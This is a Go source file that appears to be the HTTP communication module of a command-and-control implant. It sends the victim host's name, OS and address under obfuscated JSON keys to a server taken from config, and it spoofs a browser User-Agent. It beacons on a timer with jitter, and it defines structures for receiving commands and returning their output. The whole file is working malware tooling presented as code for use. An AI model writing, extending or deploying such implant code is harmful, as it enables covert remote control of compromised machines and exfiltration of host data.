package httpFuncs

import (
	"bytes"
	"compress/zlib"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"time"

	"src/Client/generic/config"
	"src/Client/generic/logger"
)

// SleepFor delays execution for the specified number of seconds.
func SleepFor(seconds int) {
	if seconds < 0 {
		logger.Warn(fmt.Sprintf("SleepFor called with negative seconds: %d. Sleeping for 0s.", seconds))
		seconds = 0
	}
	time.Sleep(time.Duration(seconds) * time.Second)
}

// compressString compresses a string using zlib.
func compressString(data string) (string, error) {
	logger.Log("Placeholder compressString: Compressing data (example with zlib).")
	var b bytes.Buffer
	w := zlib.NewWriter(&b)
	if _, err := w.Write([]byte(data)); err != nil {
		return "", fmt.Errorf("failed to write data to zlib writer: %w", err)
	}
	if err := w.Close(); err != nil {
		return "", fmt.Errorf("failed to close zlib writer: %w", err)
	}
	return b.String(), nil
}

// getHostname returns the OS hostname.
func getHostname() (string, error) {
	logger.Log("Placeholder getHostname: Getting OS hostname.")
	name, err := os.Hostname()
	if err != nil {
		return "unknown_host", fmt.Errorf("failed to get OS hostname: %w", err)
	}
	return name, nil
}

// getIPAddresses returns a list of non-loopback IPv4 addresses.
func getIPAddresses() ([]string, error) {
	logger.Log("Fetching non-loopback IPv4 addresses.")
	var ips []string
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, fmt.Errorf("failed to get network interfaces: %w", err)
	}
	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			logger.Warn(fmt.Sprintf("Failed to get addresses for interface %s: %v", i.Name, err))
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip != nil && !ip.IsLoopback() && ip.To4() != nil {
				ips = append(ips, ip.String())
			}
		}
	}
	if len(ips) == 0 {
		logger.Warn("No non-loopback IPv4 addresses found, returning 127.0.0.1 as fallback.")
		return []string{"127.0.0.1"}, nil
	}
	return ips, nil
}

func GetRequest(urlStr string) (int, string, string, error) {
	logger.Log("Performing GET request to: " + urlStr)

	client := &http.Client{Timeout: 30 * time.Second} // Customizable timeout
	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		logger.Error("Failed to create GET request for " + urlStr + ": " + err.Error())
		return -1, "", urlStr, fmt.Errorf("failed to create GET request for %s: %w", urlStr, err)
	}

	// Set headers if needed
	req.Header.Set("Accept", "application/octet-stream")
	req.Header.Set(("User-Agent"), "Chrome/90.0.4430.93 Safari/537.36") //maybe add some rand here at some point

	resp, err := client.Do(req)
	if err != nil {
		logger.Error("GET request to " + urlStr + " failed: " + err.Error())
		return -1, "", urlStr, fmt.Errorf("client.Do GET for %s failed: %w", urlStr, err)
	}
	defer resp.Body.Close()

	responseBodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		logger.Error("Failed to read response body from " + urlStr + ": " + err.Error())
		return resp.StatusCode, "", urlStr, fmt.Errorf("failed to read response body from %s: %w", urlStr, err)
	}
	responseBody := string(responseBodyBytes)

	logger.Log(fmt.Sprintf("GET request to %s succeeded. Response code: %d", urlStr, resp.StatusCode))
	if len(responseBody) > 200 {
		logger.Log(fmt.Sprintf("Response body from %s (first 200 chars): %s...", urlStr, responseBody[:200]))
	} else {
		logger.Log("Response body from " + urlStr + ": " + responseBody)
	}

	return resp.StatusCode, responseBody, urlStr, nil
}

func RetryRequest(urlStr string, attempts int, sleepDurationSeconds int) error {
	logger.Warn(fmt.Sprintf("Retrying request for URL: %s for up to %d attempts.", urlStr, attempts))
	for count := 0; count < attempts; count++ {
		logger.Warn(fmt.Sprintf("Retry attempt %d for %s", count+1, urlStr))
		SleepFor(sleepDurationSeconds * count)

		responseCode, _, _, err := GetRequest(urlStr)
		if err != nil {
			logger.Error(fmt.Sprintf("Retry attempt %d for %s failed with error: %v", count+1, urlStr, err))
		} else if responseCode == http.StatusOK {
			logger.Warn(fmt.Sprintf("Retry attempt %d for %s succeeded with response code 200", count+1, urlStr))
			return nil
		} else {
			logger.Error(fmt.Sprintf("Retry attempt %d for %s failed with response code: %d", count+1, urlStr, responseCode))
		}
	}
	finalErr := fmt.Errorf("all %d retry attempts failed for URL: %s", attempts, urlStr)
	logger.Error(finalErr.Error())
	return finalErr
}

// Post request to the specified URL with compression.
// Returns: statusCode, responseBody, error
func PostRequest(urlStr string, dataPayload string, compressData bool) (int, string, error) {
	logger.Log("Performing POST request to: " + urlStr)

	var finalPayloadBytes []byte
	contentType := "application/json" // Default
	contentEncoding := ""
	isCompressed := false

	if compressData {
		compressedStr, err := compressString(dataPayload)
		if err != nil {
			logger.Error("Compression failed: " + err.Error() + ". Sending uncompressed data.")
			finalPayloadBytes = []byte(dataPayload)
		} else {
			finalPayloadBytes = []byte(compressedStr)
			isCompressed = true
			contentType = "application/octet-stream"
			contentEncoding = "deflate"
			logger.Log(fmt.Sprintf("Data compressed. Original size: %d bytes, Compressed size: %d bytes", len(dataPayload), len(finalPayloadBytes)))
		}
	} else {
		finalPayloadBytes = []byte(dataPayload)
	}

	if !isCompressed {
		if len(dataPayload) < 200 { // Log small payloads
			logger.Log("POST data (uncompressed): " + dataPayload)
		} else {
			logger.Log(fmt.Sprintf("POST data (uncompressed, %d bytes): %s...", len(dataPayload), dataPayload[:200]))
		}
	} else {
		logger.Log(fmt.Sprintf("POST data (compressed, %d bytes)", len(finalPayloadBytes)))
	}

	client := &http.Client{Timeout: 30 * time.Second}
	req, err := http.NewRequest("POST", urlStr, bytes.NewBuffer(finalPayloadBytes))
	if err != nil {
		logger.Error("Failed to create POST request for " + urlStr + ": " + err.Error())
		return -1, "", fmt.Errorf("failed to create POST request for %s: %w", urlStr, err)
	}

	req.Header.Set("User-Agent", "Chrome/90.0.4430.93 Safari/537.36") // rand here as well????

	req.Header.Set("Content-Type", contentType)
	if isCompressed && contentEncoding != "" {
		req.Header.Set("Content-Encoding", contentEncoding)
	}

	resp, err := client.Do(req)
	if err != nil {
		logger.Error("POST request to " + urlStr + " failed: " + err.Error())
		return -1, "", fmt.Errorf("client.Do POST for %s failed: %w", urlStr, err)
	}
	defer resp.Body.Close()

	responseBodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		logger.Error("Failed to read response body from POST " + urlStr + ": " + err.Error())
		return resp.StatusCode, "", fmt.Errorf("failed to read POST response body from %s: %w", urlStr, err)
	}
	responseBody := string(responseBodyBytes)

	logger.Log(fmt.Sprintf("POST request to %s succeeded. Response code: %d", urlStr, resp.StatusCode))

	return resp.StatusCode, responseBody, nil
}

// Updated to use int for Timer and Jitter
type ConnectionResponseData struct {
	Timer  int    `json:"timer"`
	UUID   string `json:"uuid"`
	Jitter int    `json:"jitter"`
}

// Returns: timer, id, jitter, error
// Updates global currentID, currentTimer, currentJitter on success.
func HTTPConnection(address string) (float64, string, float64, error) {
	logger.Log("Starting httpConnection.")
	hostname, errHost := getHostname()
	if errHost != nil {
		logger.Warn("Failed to get hostname: " + errHost.Error() + ". Using 'unknown_hostname'.")
		hostname = "unknown_hostname"
	}

	connectURL := GenerateConnectionURL()
	logger.Log("Connection URL: " + connectURL)

	keyName := config.Obfuscation.Generic.ImplantInfo.Name
	logger.Log("Obfuscation key for 'name': " + keyName)
	keyOS := config.Obfuscation.Generic.ImplantInfo.OS
	logger.Log("Obfuscation key for 'os': " + keyOS)
	keyAddr := config.Obfuscation.Generic.ImplantInfo.Address
	logger.Log("Obfuscation key for 'address': " + keyAddr)
	valName := hostname
	valOS := config.OsIdentifier
	valAddr := config.URL

	// Build dynamic JSON with obfuscated keys
	payload := map[string]string{
		keyName: valName,
		keyOS:   valOS,
		keyAddr: valAddr,
	}
	logger.Log(fmt.Sprintf("Connection payload: %+v", payload))

	jsonDataBytes, err := json.Marshal(payload)
	if err != nil {
		logger.Error("Failed to marshal connection request JSON: " + err.Error())
		return -1, "", -1, fmt.Errorf("failed to marshal connection JSON: %w", err)
	}

	responseCode, responseBody, postErr := PostRequest(connectURL, string(jsonDataBytes), false)
	if postErr != nil {
		logger.Error("httpConnection POST request to " + connectURL + " failed: " + postErr.Error())
		return -1, "", -1, fmt.Errorf("postRequest in httpConnection failed: %w", postErr)
	}

	if responseCode != http.StatusOK { // Not 200
		err := fmt.Errorf("server at %s responded with error in httpConnection: %d %s", connectURL, responseCode, responseBody)
		logger.Error(err.Error())
		return -1, "", -1, err
	}

	logger.Log("httpConnection to " + connectURL + " succeeded. Parsing response...")
	var parsedResponse map[string]interface{}

	if err := json.Unmarshal([]byte(responseBody), &parsedResponse); err != nil {
		logger.Error("JSON parsing failed in httpConnection for response from " + connectURL + ": " + err.Error())
		return -1, "", -1, fmt.Errorf("failed to parse JSON response from %s: %w. Body: %s", connectURL, err, responseBody)
	}

	timerVal := float64(parsedResponse[config.Obfuscation.Generic.ImplantInfo.Timer].(float64))
	jitterVal := float64(parsedResponse[config.Obfuscation.Generic.ImplantInfo.Jitter].(float64))
	idVal := string(parsedResponse[config.Obfuscation.Generic.ImplantInfo.UUID].(string))

	if idVal == "" {
		logger.Error("Received empty 'uuid' in httpConnection response from " + connectURL)
		return -1, "", -1, fmt.Errorf("empty 'uuid' in response from %s", connectURL)
	}

	logger.Log(fmt.Sprintf("Parsed connection parameters from %s: timer=%f, uuid=%s, jitter=%f", connectURL, timerVal, idVal, jitterVal))
	return timerVal, idVal, jitterVal, nil
}

type ReconnectRequestData struct {
	Name    string  `json:"name"`
	OS      string  `json:"os"`
	Address string  `json:"address"`
	ID      string  `json:"id"`
	Timer   float64 `json:"timer"`
	Jitter  float64 `json:"jitter"`
}

// HTTPReconnect connects to the server to update the agent's connection parameters.
// Returns: statusCode, responseBody, error
func HTTPReconnect(address string, userID string, jitterVal float64, timerVal float64) (int, string, error) {
	// 'address' param from C++ is unused for URL generation, generateReconnectURL() provides it.
	logger.Log("Starting httpReconnect for user_id: " + userID)
	hostname, errHost := getHostname()
	if errHost != nil {
		logger.Warn("Failed to get hostname for reconnect: " + errHost.Error() + ". Using 'unknown_hostname'.")
		hostname = "unknown_hostname"
	}

	reconnectURL := GenerateReconnectURL()
	logger.Log("Reconnect URL: " + reconnectURL)

	requestPayload := ReconnectRequestData{
		Name:    hostname,
		OS:      config.OsIdentifier,
		Address: "",
		ID:      config.ID,
		Timer:   float64(config.Timer),
		Jitter:  float64(config.Jitter),
	}

	jsonDataBytes, err := json.Marshal(requestPayload)
	if err != nil {
		logger.Error("Failed to marshal reconnect request JSON: " + err.Error())
		return -1, "", fmt.Errorf("failed to marshal JSON for reconnect: %w", err)
	}

	responseCode, responseBody, postErr := PostRequest(reconnectURL, string(jsonDataBytes), false)
	if postErr != nil {
		logger.Error("httpReconnect POST request to " + reconnectURL + " failed: " + postErr.Error())
		return responseCode, "", fmt.Errorf("postRequest in httpReconnect to %s failed: %w", reconnectURL, postErr)
	}

	if responseCode != http.StatusOK {
		err := fmt.Errorf("failed to reconnect to server at %s: %d %s", reconnectURL, responseCode, responseBody)
		logger.Error("httpReconnect to " + reconnectURL + " failed with response: " + err.Error())
		return responseCode, responseBody, err
	}

	logger.Log("httpReconnect to " + reconnectURL + " succeeded.")
	logger.Log("ResponseBody from reconnect: " + responseBody) // C++ logs this but doesn't parse.
	return responseCode, responseBody, nil
}

type CommandData struct {
	Command     string
	CommandUUID string
	Data        json.RawMessage
}

type UpdateCommandPayload struct {
	Timer  float64 `json:"timer"`
	Jitter float64 `json:"jitter"`
}

type ServerResponseWithCommands struct {
	Commands []CommandData `json:"commands"`
}

type CommandReport struct { // Report sent back to server
	Output      string `json:"output"`
	CommandUUID string `json:"command_uuid"`
}

type ReportsToServerPayload struct {
	Reports []CommandReport `json:"reports"`
}
